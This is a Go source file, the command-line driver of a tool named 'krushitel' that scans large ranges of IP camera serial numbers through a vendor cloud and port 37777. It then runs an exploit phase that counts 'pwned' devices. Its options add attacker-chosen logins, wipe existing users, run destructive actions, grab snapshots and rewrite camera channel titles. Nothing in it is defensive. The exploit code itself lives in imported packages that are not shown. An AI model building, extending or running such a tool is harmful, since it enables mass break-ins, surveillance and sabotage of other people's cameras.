package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"krushitel/core/cloud"
	"krushitel/core/dhip"
	"krushitel/core/exploit"
	"krushitel/core/fwd"
	"krushitel/core/i18n"
	"krushitel/core/ironscan"
	"krushitel/core/rtsp"
	"krushitel/core/scanner"
	"krushitel/core/ui"
	"krushitel/core/update"
)

var (
	logMu   sync.Mutex
	logFile *os.File
	start   time.Time
)

func flog(format string, args ...any) {
	logMu.Lock()
	defer logMu.Unlock()
	if logFile != nil {
		fmt.Fprintf(logFile, "[%s] ", time.Now().Format("15:04:05"))
		fmt.Fprintf(logFile, format+"\n", args...)
	}
}

func out(format string, args ...any) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Printf(format+"\n", args...)
	if logFile != nil {
		fmt.Fprintf(logFile, format+"\n", args...)
	}
}

func isTTY() bool {
	fi, err := os.Stdout.Stat()
	return err == nil && fi.Mode()&os.ModeCharDevice != 0
}

func elapsed() string {
	d := time.Since(start).Truncate(time.Second)
	h := int(d.Hours())
	m := int(d.Minutes()) % 60
	s := int(d.Seconds()) % 60
	if h > 0 {
		return fmt.Sprintf("%d:%02d:%02d", h, m, s)
	}
	return fmt.Sprintf("%02d:%02d", m, s)
}

func cloudAlive() bool {
	r := &net.Resolver{}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addrs, err := r.LookupHost(ctx, fwd.MAIN_SERVER)
	return err == nil && len(addrs) > 0
}

func headlessUsage() {
	out("[%s] krushitel v%s", time.Now().Format("15:04"), update.CurrentVersion)
	rows := [][2]string{
		{"  -i, --input FILE", i18n.Tr("Файл с серийниками/префиксами")},
		{"  -m, --mode MODE", i18n.Tr("Режимы работы  (exploit (по умолчанию) | titles | ironscan)")},
		{"  -p, --port PORT", i18n.Tr("порт для ironscan (по умолчанию 37777)")},
		{"  -o, --output DIR", i18n.Tr("папка куда выводятся результаты (по умолчанию - имя входного файла)")},
		{"  -t, --threads N", i18n.Tr("кол-во потоков (по умолчанию 30)")},
		{"  -f, --fresh", i18n.Tr("игнорировать session-маркер и done.txt")},
	}
	for _, r := range rows {
		out("%-22s %s", r[0], r[1])
	}
	out(i18n.Tr("Большинство параметров есть в config.json."))
}

func runHeadless() bool {
	help := false
	headless := false
	for _, a := range os.Args[1:] {
		if strings.HasPrefix(a, "-") {
			headless = true
		}
		if a == "-h" || a == "--help" || a == "help" {
			help = true
		}
	}
	if help || headless {
		ui.LoadSettings()
		ui.ApplyLang()
	}
	if help {
		headlessUsage()
		return true
	}
	if !headless {
		return false
	}

	fs := flag.NewFlagSet("krushitel", flag.ContinueOnError)
	inFile := fs.String("i", "", "входной файл")
	fs.StringVar(inFile, "input", "", "алиас -i")
	mode := fs.String("m", "exploit", "режим: exploit | titles")
	fs.StringVar(mode, "mode", "exploit", "алиас -m")
	outDir := fs.String("o", "", "папка результатов")
	fs.StringVar(outDir, "output", "", "алиас -o")
	threads := fs.Int("t", 30, "потоки")
	fs.IntVar(threads, "threads", 30, "алиас -t")
	fresh := fs.Bool("f", false, "прогон заново, без resume")
	fs.BoolVar(fresh, "fresh", false, "алиас -f")
	port := fs.Int("p", 0, "порт для ipscan (5000) / ironscan (37777)")
	fs.IntVar(port, "port", 0, "алиас -p")
	if err := fs.Parse(os.Args[1:]); err != nil {
		headlessUsage()
		os.Exit(2)
	}
	cfg := ui.Config()
	start = time.Now()
	if *inFile == "" && cfg.LastInput != "" {
		*inFile = cfg.LastInput
		out("[i] using last input: %s", *inFile)
	}
	if *inFile == "" {
		out("[!] err: нужен -i/--input (префиксы/серийники или results.txt для titles)")
		os.Exit(2)
	}
	if *mode != "exploit" && *mode != "titles" && *mode != "ironscan" {
		out("[!] err: неизвестный режим %q — доступен exploit | titles | ironscan", *mode)
		os.Exit(2)
	}

	tty := isTTY()
	var lineLen int

	render := func(done, total int64, hits string) {
		line := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
		logMu.Lock()
		defer logMu.Unlock()
		if tty {
			if len(line) < lineLen {
				line += strings.Repeat(" ", lineLen-len(line))
			}
			lineLen = len(line)
			fmt.Printf("\r%s", line)
		} else {
			fmt.Println(line)
			if logFile != nil {
				fmt.Fprintln(logFile, line)
			}
		}
	}
	var lastProgress time.Time
	progress := func(done, total int64, hits string) {
		if !tty && time.Since(lastProgress) < 30*time.Second {
			return
		}
		lastProgress = time.Now()
		render(done, total, hits)
	}
	renderDone := func(done, total int64, hits string) {
		logMu.Lock()
		defer logMu.Unlock()
		final := fmt.Sprintf("%d/%d | %s | %s", done, total, hits, elapsed())
		if tty {
			if len(final) < lineLen {
				final += strings.Repeat(" ", lineLen-len(final))
			}
			fmt.Printf("\r%s\n", final)
			lineLen = 0
		} else {
			fmt.Println(final)
		}
		if logFile != nil {
			fmt.Fprintln(logFile, final)
		}
	}

	if *mode != "ironscan" && !cloudAlive() {
		out("[!] NetErr: Timeout (easy4ip) | Check your internet connection")
		os.Exit(1)
	}

	switch *mode {
	case "exploit":
		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, progress, renderDone))
	case "titles":
		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, progress, renderDone))
	case "ironscan":
		os.Exit(runHeadlessIronScan(cfg, *inFile, *outDir, *threads, *port, progress, renderDone))
	}
	return true
}

func runHeadlessIronScan(cfg ui.Settings, inFile, outFile string, threads, port int,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	targets, terr := ironscan.LoadTargets(inFile)
	if terr != nil {
		if t := strings.TrimSpace(inFile); t != "" && !strings.ContainsAny(t, " 	") {
			targets = ironscan.ParseTarget(t)
		} else {
			out("[!] err: входной файл: %v", terr)
			return 2
		}
	}
	if len(targets) == 0 {
		out("[!] err: целей нет")
		return 2
	}
	if port == 0 {
		port = 37777
	}
	if outFile == "" {
		outFile = strings.ReplaceAll(filepath.Base(inFile), ".", "_") + "_iron.txt"
	}
	if filepath.Ext(outFile) == "" {
		outFile += ".txt"
	}
	if threads <= 0 {
		threads = 200
	}

	headlessLogOpen(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
	rewriteFile := !headlessAskRewrite(outFile, false)
	ironscan.LogHook = func(f string, a ...any) { flog("%s", fmt.Sprintf(f, a...)) }
	defer func() { ironscan.LogHook = nil }()

	headlessBanner(false)
	out("started ironscanning %d targets (port %d)", len(targets), port)
	out("saving results at //%s", outFile)

	var checked, found int64
	var mu sync.Mutex
	flags := os.O_CREATE | os.O_WRONLY | os.O_APPEND
	if !rewriteFile {
		flags = os.O_CREATE | os.O_WRONLY | os.O_TRUNC
	}
	resFile, rerr := os.OpenFile(outFile, flags, 0644)
	if rerr != nil {
		out("[!] err: выходной файл: %v", rerr)
		return 2
	}
	defer resFile.Close()
	save := func(line string) {
		mu.Lock()
		fmt.Fprintln(resFile, line)
		mu.Unlock()
	}

	ctx, stop := headlessSignals()
	defer stop()

	doneEvents := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(atomic.LoadInt64(&checked), int64(len(targets)), fmt.Sprintf("found: %d", atomic.LoadInt64(&found)))
			case <-doneEvents:
				return
			}
		}
	}()

	irErr := ironscan.Run(ctx, ironscan.Options{
		Targets:     targets,
		Port:        port,
		Timeout:     5 * time.Second,
		Concurrency: threads,
	}, func(r ironscan.Result) {
		atomic.AddInt64(&checked, 1)
		if r.Ok() {
			atomic.AddInt64(&found, 1)
			line := fmt.Sprintf("%s | %s | %s | %s", r.Target, r.Serial, r.Model, r.Firmware)
			save(line)
			flog("[+] %s", line)
		} else if r.Err != "" {
			flog("[-] %s: %s", r.Target, r.Err)
		}
	})
	close(doneEvents)
	renderDone(atomic.LoadInt64(&checked), int64(len(targets)), fmt.Sprintf("found: %d", atomic.LoadInt64(&found)))

	if irErr != nil {
		out("[!] err: ironscan: %v", irErr)
		return 1
	}
	out("ironscan finished")
	if ctx.Err() != nil {
		return 130
	}
	return 0
}

func headlessBanner(online bool) {
	now := time.Now().Format("15:04")
	if !online {
		out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	rel, err := update.Check(ctx)
	if err != nil || rel == nil {
		out("[%s] krushitel v%s-beta (latest)", now, update.CurrentVersion)
		return
	}
	out("[%s] krushitel v%s-beta", now, update.CurrentVersion)
	out("new update! (v%s)", rel.Version)
	out("do you want to update? (y/n)")
	var ans string
	_, _ = fmt.Scanln(&ans)
	ans = strings.ToLower(strings.TrimSpace(ans))
	if ans != "y" && ans != "yes" {
		return
	}
	out("updating to v%s...", rel.Version)
	update.Install(context.Background(), rel)
	if err := update.Restart(os.Stdout, os.Stderr); err != nil {
		out("[!] err: перезапуск не вышел: %v", err)
		os.Exit(1)
	}
	os.Exit(0)
}

func headlessSignals() (context.Context, func()) {
	ctx, cancel := context.WithCancel(context.Background())
	sigCh := make(chan os.Signal, 4)
	signal.Notify(sigCh, os.Interrupt)
	go func() {
		n := 0
		for range sigCh {
			n++
			if n == 1 {
				out("[!] detected CTRL + C! exiting... - 1x")
				cancel()
			} else {
				out("[!] Force shutdown - 2x")
				os.Exit(130)
			}
		}
	}()
	return ctx, func() { signal.Stop(sigCh); cancel() }
}

func headlessAskRewrite(path string, isDir bool) bool {
	st, err := os.Stat(path)
	if err != nil || st.IsDir() != isDir {
		return true
	}
	label := "file"
	if isDir {
		label = "folder"
	}
	out("[!] %s %s already exists! rewrite or modify %s? (r/m)", label, path, label)
	var ans string
	_, _ = fmt.Scanln(&ans)
	ans = strings.ToLower(strings.TrimSpace(ans))
	return ans == "r" || ans == "rewrite"
}

func headlessLogOpen(path string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		out("[!] err: лог-файл не открылся: %v", err)
		return
	}
	logFile = f
}

func wireHooks(cfg ui.Settings) func() {
	fwd.Debug = cfg.Debug
	fwd.LogHook = func(line string) { flog("%s", line) }
	cloud.LogHook = func(line string) { flog("%s", line) }
	dhip.LogHook = func(format string, args ...any) {
		flog("%s", fmt.Sprintf(format, args...))
	}
	exploit.LogHook = func(format string, args ...any) {
		flog("%s", fmt.Sprintf(format, args...))
	}
	return func() {
		fwd.LogHook = nil
		cloud.LogHook = nil
		dhip.LogHook = nil
		exploit.LogHook = nil
	}
}

func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {

	prefixes, direct, lerr := exploit.LoadTargetInput(inFile)
	if lerr != nil {
		out("[!] err: %v", lerr)
		return 2
	}
	_, isFile := os.Stat(inFile)
	if outDir == "" {
		if len(prefixes) > 0 && isFile != nil {
			if len(prefixes) == 1 {
				outDir = "prefix_" + prefixes[0]
			} else {
				outDir = fmt.Sprintf("prefixes_%d", len(prefixes))
			}
		} else {
			outDir = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile))
		}
	}
	if threads <= 0 {
		threads = 30
	}

	headlessBanner(true)

	rewrite := headlessAskRewrite(outDir, true)
	if rewrite {
		for _, f := range []string{exploit.ResultsFile, exploit.DoneFile, exploit.NoStunFile, exploit.SessionFile,
			exploit.AliveFile, exploit.CrashScanJSON, exploit.CrashScanTXT} {
			_ = os.Remove(filepath.Join(outDir, f))
		}
		fresh = true
	}

	_ = os.MkdirAll(outDir, 0755)
	headlessLogOpen(filepath.Join(outDir, "log.txt"))
	rtsp.StdoutSink = logFile
	unhook := wireHooks(cfg)
	defer unhook()

	scanTotal := int64(len(prefixes)) * scanner.SuffixCombos
	if len(prefixes) > 0 {
		noun := "prefixes"
		if len(prefixes) == 1 {
			noun = "prefix"
		}
		out("started exploiting %d %s | %d serials", len(prefixes), noun, scanTotal)
	} else {
		out("started exploiting %d SNs", len(direct))
	}
	out("saving results at //%s", outDir)
	ui.RememberRun(inFile, outDir, threads)

	resume := false
	if !fresh {
		if sess := exploit.ReadSession(outDir); sess != nil {
			if done := exploit.ReadDoneSet(filepath.Join(outDir, exploit.DoneFile)); len(done) > 0 {
				resume = true
				flog("resume: прошлый прогон %q, отработано %d", sess.InFile, len(done))
			}
		}
	}

	exploit.WriteSession(outDir, exploit.SessionInfo{
		InFile:   inFile,
		Threads:  threads,
		Total:    len(prefixes) + len(direct),
		Started:  time.Now().Format("02.01.2006 15:04:05"),
		Prefixes: prefixes,
	})

	fwd.InitLimit = 100

	ctx, stop := headlessSignals()
	defer stop()

	tp := &exploit.TwoPhaseStats{
		Scan:        &scanner.ScanStats{},
		Exp:         &exploit.Stats{},
		PrefixCount: len(prefixes),
		DirectCount: len(direct),
		ScanTotal:   scanTotal,
	}

	events := make(chan string, 1024)
	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			flog("%s", line)
		}
	}()

	go func() {
		prev := int32(0)
		for {
			select {
			case <-doneEvents:
				return
			case <-time.After(100 * time.Millisecond):
				p := atomic.LoadInt32(&tp.Phase)
				if p == prev {
					continue
				}
				if p == 1 {
					out("[1/2] scanning %d serials", scanTotal)
				}
				if p == 2 && len(prefixes) > 0 {
					out("[2/2] exploiting %d serials", tp.TargetCount())
				}
				prev = p
			}
		}
	}()

	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&tp.Phase) == 1 {
					progress(atomic.LoadInt64(&tp.Scan.PrefixDone), int64(len(prefixes)),
						fmt.Sprintf("found: %d", tp.FoundCount()))
				} else {
					progress(tp.Exp.Processed, tp.Exp.Total,
						fmt.Sprintf("pwned: %d · added: %d", tp.Exp.Pwned, tp.Exp.Added))
				}
			case <-doneEvents:
				return
			}
		}
	}()

	exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, threads, exploit.Opts{
		OutDir:      outDir,
		Snaps:       cfg.Snaps,
		XML:         cfg.XML,
		Titles:      cfg.Titles,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
		DummyLogin:  cfg.DummyLogin,
		DummyPass:   cfg.DummyPass,
		Resume:      resume,
		Destructive: cfg.Destructive,
		WipeUsers:   cfg.WipeUsers,
		AntiCumShot: cfg.AntiCumShot,
	}, tp, events)

	close(doneEvents)
	close(events)
	if tp.PhaseNum() == 1 {
		renderDone(atomic.LoadInt64(&tp.Scan.PrefixDone), int64(len(prefixes)),
			fmt.Sprintf("found: %d", tp.FoundCount()))
	} else {
		renderDone(tp.Exp.Processed, tp.Exp.Total,
			fmt.Sprintf("pwned: %d · added: %d", tp.Exp.Pwned, tp.Exp.Added))
	}

	if msg := tp.Scan.ErrorMsg; msg != "" {
		out("[!] err: scan: %s", msg)
		return 1
	}
	if msg := tp.Exp.ErrorMsg; msg != "" {
		out("[!] err: %s", msg)
		return 1
	}
	out("exploit finished")
	if ctx.Err() != nil {
		if tp.PhaseNum() == 1 {
			flog("прервано в скане: session-маркер и чекпоинт сохранены, следующий запуск продолжит с позиции")
		} else {
			flog("прервано: session-маркер сохранён, следующий запуск продолжит")
		}
		return 130
	}
	return 0
}

func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
	cams, skipped, err := exploit.ParseResultsCreds(inFile)
	if err != nil {
		out("[!] err: входной файл: %v", err)
		return 2
	}
	if len(cams) == 0 {
		out("[!] err: файл пуст или камер не нашлось")
		return 2
	}

	logName := strings.TrimSuffix(inFile, filepath.Ext(inFile)) + "_titles.log"
	headlessLogOpen(logName)
	unhook := wireHooks(cfg)
	defer unhook()

	headlessBanner(true)
	out("started titling %d cams", len(cams))
	if skipped > 0 {
		out("skipped %d lines", skipped)
	}

	if threads <= 0 {
		threads = 200
	}
	ctx, stop := headlessSignals()
	defer stop()

	stats := &exploit.TitlesStats{}
	events := make(chan string, 1024)
	doneEvents := make(chan struct{})
	go func() {
		for line := range events {
			flog("%s", line)
		}
	}()
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				progress(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))
			case <-doneEvents:
				return
			}
		}
	}()

	exploit.RunTitles(ctx, cams, threads, exploit.Opts{
		Titles:      true,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
	}, stats, events)

	close(doneEvents)
	close(events)
	renderDone(stats.Processed, stats.Total, fmt.Sprintf("titled: %d", stats.Titled))

	if stats.ErrorMsg != "" {
		out("[!] err: %s", stats.ErrorMsg)
		return 1
	}
	out("titles finished")
	if ctx.Err() != nil {
		return 130
	}
	return 0
}
